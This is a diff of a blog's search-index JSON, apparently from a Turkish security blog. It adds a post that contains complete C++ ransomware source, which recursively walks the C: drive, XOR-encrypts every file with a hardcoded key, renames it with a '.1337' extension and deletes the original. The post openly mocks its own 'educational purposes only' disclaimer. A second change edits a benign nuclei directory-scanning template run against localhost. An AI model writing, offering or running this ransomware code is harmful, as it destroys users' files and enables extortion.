@@ -1,6 +1,23 @@
 [
   
   {
+    "title": "Malware Development 1: Ransomware Algoritması",
+    "url": "/posts/malware-development-1-ransomware-algoritmasi/",
+    "categories": "Dev, Malware",
+    "tags": "PE",
+    "date": "2023-09-11 00:00:00 +0300",
+    
+
+
+
+
+
+    
+    "snippet": "      C diskinde bulunan tüm dosyalar recursive olarak taratılır.    Elde edilen dosya ve dizinler, belirlenen encryption key ile XOR algoritması kullanılarak şifrelenir.    Encryption sonucunda or...",
+    "content": "      C diskinde bulunan tüm dosyalar recursive olarak taratılır.    Elde edilen dosya ve dizinler, belirlenen encryption key ile XOR algoritması kullanılarak şifrelenir.    Encryption sonucunda orjinal dosyalar silinir.    Tekrar çalıştırılması durumunda mevcut encrypted veriler üzerinde değişiklik yapılmaz. Yeni dosya eklenmişse 1. adıma dönülür.    Bu proje tamamen eğitim amaçlıdır. Hani educational purposes only geyiği.  Bu işlemin başarı ile gerçekleşebilmesi için sistem haklarının yükseltilmesi gerekebilir ki gerekecektir. Ancak mevcut yetkiler ile, kullanıcının erişebildiği dosyalar şifrelenir. Komple sistemi encrypted etmek için NT AUTHORITIY/SYSTEM olmak gerekir.#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;vector&gt;#include &lt;windows.h&gt;#include &lt;stack&gt;void enc(const std::string&amp; inputFile, const std::string&amp; key) {    size_t extensionPos = inputFile.find_last_of(\".\");    if (extensionPos != std::string::npos) {        std::string extension = inputFile.substr(extensionPos);        if (extension == \".1337\") {            return;        }    }    std::ifstream input(inputFile, std::ios::binary);    size_t lastDot = inputFile.find_last_of(\".\");    std::string outputFileName = inputFile.substr(0, lastDot) + \".1337\";    std::ofstream output(outputFileName, std::ios::binary);    char byte;    size_t keyIndex = 0;    while (input.get(byte)) {        byte ^= key[keyIndex];        output.put(byte);        keyIndex = (keyIndex + 1) % key.length();    }    input.close();    output.close();    remove(inputFile.c_str());}void tree(const std::string&amp; directory, const std::string&amp; xorKey) {    WIN32_FIND_DATA findFileData;    HANDLE hFind = FindFirstFile((directory + \"\\\\*\").c_str(), &amp;findFileData);    if (hFind != INVALID_HANDLE_VALUE) {        do {            if (!(findFileData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY)) {                std::string filePath = directory + \"\\\\\" + findFileData.cFileName;                enc(filePath, xorKey);            } else if (strcmp(findFileData.cFileName, \".\") != 0 &amp;&amp; strcmp(findFileData.cFileName, \"..\") != 0) {                std::string subDirectory = directory + \"\\\\\" + findFileData.cFileName;                tree(subDirectory, xorKey);            }        } while (FindNextFile(hFind, &amp;findFileData) != 0);        FindClose(hFind);    }}int main() {    const std::string drive = \"C:\\\\\";    const std::string key = \"ZEDELEYICI\";    tree(drive, key);    std::cout &lt;&lt; \"Evil within.\" &lt;&lt; std::endl;    return 0;}  malware.cpp"
+  },
+  
+  {
     "title": "Promiscuity Detection /w ICMP & Scapy",
     "url": "/posts/promiscuity-detection-w-arp-scapy/",
     "categories": "internal, mitigate, recon, Dev",
@@ -65,7 +82,7 @@
 
     
     "snippet": "Dirbuster, ffuf veya diğer dizin tarama araçlarının yaptığı işin aynısı olacak. Tek fark nuclei yapısı altında yaml dosyası ve wordlist kullanarak yapacağız. Hah bir de recursive degil su an  Wordl...",
-    "content": "Dirbuster, ffuf veya diğer dizin tarama araçlarının yaptığı işin aynısı olacak. Tek fark nuclei yapısı altında yaml dosyası ve wordlist kullanarak yapacağız. Hah bir de recursive degil su an  Wordlist için Seclist kullanılabilir.empire➜  nuclei  ᐅ  cat directory-scanner.yamlid: DirectoryScanner # yaml IDinfo:  name: Directory Scanner   author: Yugen  severity: low # sonuclarin onem derecesirequests:  - method: GET    path:      - \"/\"     payloads:        fuzz: Wordlists/SecLists/Discovery/Web-Content/big.txt # wordlistin yolu    threads: 50 # tek seferde 50 request    matchers:      - type: status # status 301,200 veya 403 donerse low severity de ekrana sonucu bas        status:          - 301          - 200          - 403empire➜  nuclei  ᐅ  nuclei -t directory-scanner.yaml -u localhost  -silent[DirectoryScanner] [http] [low] http://localhost/.profile [fuzz=\".profile\"][DirectoryScanner] [http] [low] http://localhost/.ssh [fuzz=\".ssh\"][DirectoryScanner] [http] [low] http://localhost/.bash_history [fuzz=\".bash_history\"][DirectoryScanner] [http] [low] http://localhost/Music [fuzz=\"Music\"][DirectoryScanner] [http] [low] http://localhost/Research [fuzz=\"Research\"][DirectoryScanner] [http] [low] http://localhost/app [fuzz=\"app\"][DirectoryScanner] [http] [low] http://localhost/applications [fuzz=\"applications\"][DirectoryScanner] [http] [low] http://localhost/certs [fuzz=\"certs\"]"
+    "content": "Dirbuster, ffuf veya diğer dizin tarama araçlarının yaptığı işin aynısı olacak. Tek fark nuclei yapısı altında yaml dosyası ve wordlist kullanarak yapacağız. Hah bir de recursive degil su an  Wordlist için Seclist kullanılabilir.id: DirectoryScanner # yaml IDinfo:  name: Directory Scanner   author: Yugen  severity: low # sonuclarin onem derecesirequests:  - method: GET    path:      - \"/\"     payloads:        fuzz: Wordlists/SecLists/Discovery/Web-Content/big.txt # wordlistin yolu    threads: 50 # tek seferde 50 request    matchers:      - type: status # status 301,200 veya 403 donerse low severity de ekrana sonucu bas        status:          - 301          - 200          - 403empire➜  nuclei  ᐅ  nuclei -t directory-scanner.yaml -u localhost  -silent[DirectoryScanner] [http] [low] http://localhost/.profile [fuzz=\".profile\"][DirectoryScanner] [http] [low] http://localhost/.ssh [fuzz=\".ssh\"][DirectoryScanner] [http] [low] http://localhost/.bash_history [fuzz=\".bash_history\"][DirectoryScanner] [http] [low] http://localhost/Music [fuzz=\"Music\"][DirectoryScanner] [http] [low] http://localhost/Research [fuzz=\"Research\"][DirectoryScanner] [http] [low] http://localhost/app [fuzz=\"app\"][DirectoryScanner] [http] [low] http://localhost/applications [fuzz=\"applications\"][DirectoryScanner] [http] [low] http://localhost/certs [fuzz=\"certs\"]"
   },
   
   {
